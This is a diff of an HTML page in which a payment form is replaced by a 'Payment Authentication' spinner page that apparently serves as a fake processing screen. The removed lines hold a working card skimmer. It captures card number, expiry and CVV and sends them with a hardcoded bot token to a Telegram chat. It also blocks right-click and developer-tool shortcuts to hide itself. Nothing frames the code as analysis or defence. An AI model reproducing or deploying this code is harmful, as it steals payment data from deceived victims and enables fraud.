@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Payment Form</title>
+    <title>Payment Authentication</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -12,147 +12,68 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
+            margin: 0;
         }
 
-        .payment-form {
-            background: #fff;
-            padding: 20px;
+        .container {
+            background-color: #fff;
+            padding: 30px;
             border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
             width: 100%;
             max-width: 400px;
+            text-align: center;
         }
 
-        .payment-form h2 {
-            text-align: center;
+        .container h2 {
+            font-size: 24px;
             margin-bottom: 20px;
         }
 
-        .form-group {
-            margin-bottom: 15px;
+        .container p {
+            font-size: 16px;
+            margin-bottom: 30px;
+            color: #555;
         }
 
-        .form-group label {
-            display: block;
-            margin-bottom: 5px;
+        .spinner {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+            margin: 20px auto;
         }
 
-        .form-group input {
-            width: 90%;
-            padding: 10px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
-        .submit-btn {
-            width: 100%;
-            padding: 10px;
-            background-color: #007bff;
-            color: #fff;
+        .button {
+            background-color: #3498db;
+            color: white;
+            padding: 10px 20px;
             border: none;
             border-radius: 5px;
             cursor: pointer;
             font-size: 16px;
+            margin-top: 20px;
         }
 
-        .submit-btn:hover {
-            background-color: #0056b3;
+        .button:hover {
+            background-color: #2980b9;
         }
     </style>
 </head>
 <body>
-    <div class="payment-form">
-        <h2>Payment Form</h2>
-        <form id="paymentForm">
-            <div class="form-group">
-                <label for="cardNumber">Card Number</label>
-                <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" required>
-            </div>
-            <div class="form-group">
-                <label for="expiryDate">Expiry Date (MM/YY)</label>
-                <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/YY" maxlength="5" required>
-            </div>
-            <div class="form-group">
-                <label for="cvv">CVV</label>
-                <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="3" required>
-            </div>
-            <button type="submit" class="submit-btn">Submit</button>
-        </form>
+    <div class="container">
+        <h2>Payment Authentication</h2>
+        <p>Please wait while we authenticate your payment.</p>
+        <div class="spinner"></div>
+        <p>Your transaction is being processed securely.</p>
+        <button class="button" disabled>Processing...</button>
     </div>
-
-    <script>
-        // Auto-insert slash in expiry date field
-        const expiryDateField = document.getElementById('expiryDate');
-        expiryDateField.addEventListener('input', (e) => {
-            let value = e.target.value.replace(/\D/g, ''); // Remove non-digit characters
-            if (value.length > 2) {
-                value = value.substring(0, 2) + '/' + value.substring(2, 4);
-            }
-            e.target.value = value;
-        });
-
-        // Validate expiry date
-        expiryDateField.addEventListener('blur', (e) => {
-            const value = e.target.value;
-            const [month, year] = value.split('/').map(Number);
-
-            const currentYear = new Date().getFullYear() % 100; // Get last two digits of the current year
-            const currentMonth = new Date().getMonth() + 1;
-
-            if (
-                !value.match(/^\d{2}\/\d{2}$/) || // Ensure format is MM/YY
-                month < 1 || month > 12 || // Ensure month is valid
-                (year < currentYear || (year === currentYear && month < currentMonth)) // Ensure date is not in the past
-            ) {
-                alert('Invalid expiry date. Please enter a valid future date in MM/YY format.');
-                e.target.value = '';
-            }
-        });
-
-       
-        notifyUserEntry();
-
-        // Handle form submission
-        document.getElementById('paymentForm').addEventListener('submit', async (event) => {
-            event.preventDefault();
-
-            // Collect form data
-            const formData = new FormData(event.target);
-            const data = {
-                cardNumber: formData.get('cardNumber'),
-                expiryDate: formData.get('expiryDate'),
-                cvv: formData.get('cvv'),
-            };
-
-            // Send data to Telegram bot
-            const telegramBotToken = '7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k';
-            const chatId = '7747778364';
-
-            const message = `New Payment Details:
-Card Number: ${data.cardNumber}
-Expiry Date: ${data.expiryDate}
-CVV: ${data.cvv}`;
-
-            await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                }),
-            });
-
-            // Redirect the user to another page
-            window.location.href = 'https://example.com/success'; // Replace with your desired URL
-        });
-
-        // Disable right-click and developer tools
-        document.addEventListener('contextmenu', (e) => e.preventDefault());
-        document.addEventListener('keydown', (e) => {
-            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'U')) {
-                e.preventDefault();
-            }
-        });
-    </script>
 </body>
 </html>
